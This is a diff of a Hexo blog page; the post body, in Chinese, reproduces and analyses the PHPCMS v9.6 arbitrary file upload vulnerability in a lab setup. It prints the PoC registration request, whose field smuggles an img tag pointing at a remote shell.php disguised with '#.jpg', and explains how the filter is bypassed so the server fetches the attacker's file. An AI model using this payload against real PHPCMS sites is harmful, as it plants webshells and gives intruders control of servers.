@@ -1,5 +1,68 @@
-<!DOCTYPE html><html><head><meta name="generator" content="Hexo 3.9.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width, initial-scale=1"><title>phpcmsv9文件上传漏洞[复现]</title><link rel="shortcut icon" href="/images/avatar.png"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="stylesheet" href="//cdn.bootcss.com/highlight.js/9.2.0/styles/github.min.css"><script src="//cdn.bootcss.com/highlight.js/9.2.0/highlight.min.js"></script></head><body><nav class="main-nav"><a href="/">Home</a><a href="/archives">Archives</a></nav><div class="profile"><section id="wrapper"><header id="header"><a href="/about"><img class="2x" id="avatar" src="/images/avatar.png"></a><h1>The clown is laughing at you</h1><h2></h2></header></section></div><section class="post" id="wrapper"><article><header><h1>phpcmsv9文件上传漏洞[复现]</h1><h2 class="headline">Jul 19, 2019 10:47·2.1k words
-·10 minutes read<span class="tags"></span></h2></header><div id="toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#写在前面"><span class="toc-text">写在前面</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-漏洞原理"><span class="toc-text">0x01 漏洞原理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-漏洞分析"><span class="toc-text">0x02 漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#触发点追溯"><span class="toc-text">触发点追溯</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#考虑过滤"><span class="toc-text">考虑过滤</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#总结"><span class="toc-text">总结</span></a></li></ol></div><section id="post-body"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>phpcmsv9<br>ubuntu19<br>mysql+php5.6</p>
+<!DOCTYPE html>
+<html lang=>
+  <head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="description" content="">
+  <meta name="keywords" content="root">
+  
+    <link rel="icon" href="/favicon.ico">
+  
+    
+  <title>phpcmsv9文件上传漏洞[复现] | The clown is laughing at you</title>
+  <link rel="stylesheet" href="/style.css">
+  <link rel="stylesheet" href="/lib/jquery.fancybox.min.css">
+  <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+</head>
+
+<body>
+  <header>
+  <div class="header-container">
+    <a class='logo' href="/">
+      <span>The clown is laughing at you</span>
+    </a>
+    <ul class="right-header">
+      
+        <li class="nav-item">
+          
+            <a href="/" class="item-link">首页</a>
+          
+        </li>
+      
+        <li class="nav-item">
+          
+            <a href="/about" class="item-link">关于</a>
+          
+        </li>
+      
+        <li class="nav-item">
+          
+            <a href="/archives" class="item-link">归档</a>
+          
+        </li>
+      
+        <li class="nav-item">
+          
+            <a href="/tags" class="item-link">标签</a>
+          
+        </li>
+      
+    </ul>
+  </div>
+</header>
+
+  <main id='post'>
+  <div class="content">
+    <article>
+        <section class="content markdown-body">
+          <h1>phpcmsv9文件上传漏洞[复现]</h1>
+          <div class='post-meta'>
+            <i class="fa fa-calendar" aria-hidden="true"></i> <time>2019/07/19</time>
+            
+            
+          </div>
+          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>phpcmsv9<br>ubuntu19<br>mysql+php5.6</p>
 <h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>这两天在家里，状态特别不好，因为家里的网速差，上个网都慢的要死，所以整的我整个人都十分的郁闷<br>然后提前溜回学校吧，还是实验室好啊，今天尝试复现phpcmsv9.6中的任意文件上传漏洞，在复现的过程中，看完POC后，自己尝试寻找触发点，其间意识到debug的重要性，然后差不多一个下午都在试着使用debug，然后绕了不少弯路，现在还在学习使用，这次的复现，debug起到至关重要的作用。<br>然后有一个要命的地方，函数的操作和数据库之间的联系，我发现我没有很好的联系在一起。</p>
 <h1 id="0x01-漏洞原理"><a href="#0x01-漏洞原理" class="headerlink" title="0x01 漏洞原理"></a>0x01 漏洞原理</h1><p>由于过滤的不当，使得文件可以绕过后缀限制，实现文件上传。</p>
 <h1 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h1><h2 id="触发点追溯"><a href="#触发点追溯" class="headerlink" title="触发点追溯"></a>触发点追溯</h2><p>路由就不介绍了…..<br>看过POC，其中payload为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?m=member&amp;c=index&amp;a=register&amp;siteid=<span class="number">1</span></span><br><span class="line">POST:siteid=<span class="number">1</span>&amp;modelid=<span class="number">11</span>&amp;username=<span class="number">123456</span>&amp;password=<span class="number">123456</span>&amp;email=<span class="number">123456</span>@qq.com&amp;info[content]=&lt;img src=http:<span class="comment">//127.0.0.1/shell.php#.jpg&gt;&amp;dosubmit=1&amp;protocol=</span></span><br></pre></td></tr></table></figure></p>
@@ -28,4 +91,165 @@
 <p>跟进函数fillurl()::300行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">$pos = strpos($surl,<span class="string">'#'</span>);</span><br><span class="line"><span class="keyword">if</span>($pos&gt;<span class="number">0</span>) $surl = substr($surl,<span class="number">0</span>,$pos);</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
 <p>截取’#’之前的内容，所以绕过过滤后，将会通过<a href="http://vps/shell.php得到文件内容" target="_blank" rel="noopener">http://vps/shell.php得到文件内容</a></p>
 <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>还是那句话，善于使用debug,动态调试，然后在一些小的地方，可以通过var_dump()，print_r()，这种函数，进行手动debug,代码的分析能力还需提高。<br>要加深对数据库的学习。多学吧，送给自己一句话：现在浪费的时间，都是给未来的自己挖坑。</p>
-</section><nav id="post-nav"><span class="prev"></span><span class="next"><a href="/2019/07/18/phpcmsv9sql注入漏洞-复现/">Older Posts<span class="arrow">→</span></a></span></nav></article></section><footer id="footer"><div id="social"><a class="symbol" href="https://github.com/fuzhouxxdong"><i class="fa fa-github"></i></a></div><p class="small">© Copyright 2018 &nbsp;<i class="fa fa-heart" aria-hidden="true">&nbsp;Dxx</i></p><p class="small">Powered by &nbsp;<a href="https://hexo.io/">Hexo &nbsp;</a>Theme By &nbsp;<a href="https://github.com/fuzhouxxdong/hexo-theme-dxx">Dxx</a></p></footer><script>hljs.initHighlightingOnLoad();</script></body></html>
+
+        </section>
+    </article>
+    
+        <!-- disqus 评论框 start -->
+        <div class="comment">
+            <div id="disqus_thread" class="disqus-thread">
+              <i>Loading comments box needs to over the wall</i>
+            </div>
+        </div>
+        <!-- disqus 评论框 end -->
+    
+    
+        <!-- livere 评论框 start -->
+        <div class="comment">
+            <div id="lv-container" data-id="city" data-uid="your_livere_uid"></div>
+        </div>
+        <!-- livere 评论框 end -->
+        
+  </div>
+  <aside>
+    
+    <div class="toc-container">
+        <h1>目录</h1>
+        <div class="content">
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#写在前面"><span class="toc-number">1.1.</span> <span class="toc-text">写在前面</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-漏洞原理"><span class="toc-number">2.</span> <span class="toc-text">0x01 漏洞原理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-漏洞分析"><span class="toc-number">3.</span> <span class="toc-text">0x02 漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#触发点追溯"><span class="toc-number">3.1.</span> <span class="toc-text">触发点追溯</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#考虑过滤"><span class="toc-number">3.2.</span> <span class="toc-text">考虑过滤</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#总结"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a></li></ol>
+        </div>
+    </div>
+    
+  </aside>
+</main>
+
+<!-- disqus 公共JS代码 -->
+<script type="text/javascript">
+  /* * * CONFIGURATION VARIABLES * * */
+  var disqus_shortname = "your_disqus_shortname";
+  var disqus_identifier = "http://yoursite.com/2019/07/19/phpcmsv9文件上传漏洞-复现/";
+  var disqus_url = "http://yoursite.com/2019/07/19/phpcmsv9文件上传漏洞-复现/";
+
+  isAgent(getDisqus)
+
+  // determine user agent in China
+  function isAgent(cb) {
+    var url = '//graph.facebook.com/feed?callback=h';
+    var xhr = new XMLHttpRequest();
+    var called = false;
+    xhr.open('GET', url);
+    xhr.onreadystatechange = function() {
+      if (xhr.readyState === 4 && xhr.status === 200) {
+      called = true;
+      cb(true);
+      }
+    };
+    xhr.send();
+    // timeout 1s, this facebook API is very fast.
+    setTimeout(function() {
+      if (!called) {
+      xhr.abort();
+      cb(false)
+      }
+    }, 1000);
+  }
+
+  function getDisqus(isAgent) {
+    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; 
+    dsq.async = true
+    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq)
+  }
+</script>
+<!-- disqus 公共JS代码 end -->
+
+
+<script type="text/javascript">
+  (function(d, s) {
+      var j, e = d.getElementsByTagName(s)[0];
+
+      if (typeof LivereTower === 'function') { return; }
+
+      j = d.createElement(s);
+      j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+      j.async = true;
+
+      e.parentNode.insertBefore(j, e);
+  })(document, 'script');
+</script>
+
+
+  <footer>
+  <div class="copyright">
+    <div>
+      &copy; 2019 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a>&nbsp
+    </div>
+    <div>
+      Theme by <a href="https://github.com/lewis-geek/hexo-theme-Aath" target="_blank">Aath</a>
+    </div>
+  </div>
+</footer>
+
+
+<script src="https://cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script>
+<script src="/lib/in-view.min.js"></script>
+<script src="/lib/lodash.min.js"></script>
+<script>
+  var isDown = true
+  var oldY = 0
+  inView.offset(50)
+
+  document.body.addEventListener('touchstart', function(){});
+  
+  window.addEventListener('scroll', _.throttle(e => {
+    var currentY = window.scrollY
+    if((oldY - currentY) < 0) {
+      isDown = true
+    } else {
+      isDown = false
+    }
+    oldY = currentY
+  }, 250))
+
+  $("article img").each(function() {
+      var strA = "<a data-fancybox='gallery' href='" + this.src + "'></a>";
+      $(this).wrapAll(strA);
+  });
+
+  $('.toc-link').each(function() {
+      var href = $(this).attr("href");
+      
+      inView(href).on('exit', () => {
+        if (isDown) {
+          handleActive(href)
+        }
+      })
+
+      inView(href).on('enter', () => {
+        if (!isDown) {
+          handleActive(href)
+        }
+      })
+
+      this.onclick = function(e) {
+        var pos = $(href).offset().top - 10;
+        $("html,body").animate({scrollTop: pos}, 300);
+        setTimeout(() => {
+          handleActive(href)
+        }, 350)
+        return false
+      }
+  })
+
+  function handleActive(href) {
+    document.querySelectorAll('.toc-link').forEach(elm => {
+      elm.classList.remove('active')
+    })
+    document.querySelector(".toc [href='"+ href +"']").classList.add('active')
+  }
+</script>
+<script src="/lib/jquery.fancybox.min.js"></script>
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"live2d-xuexiaoban"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
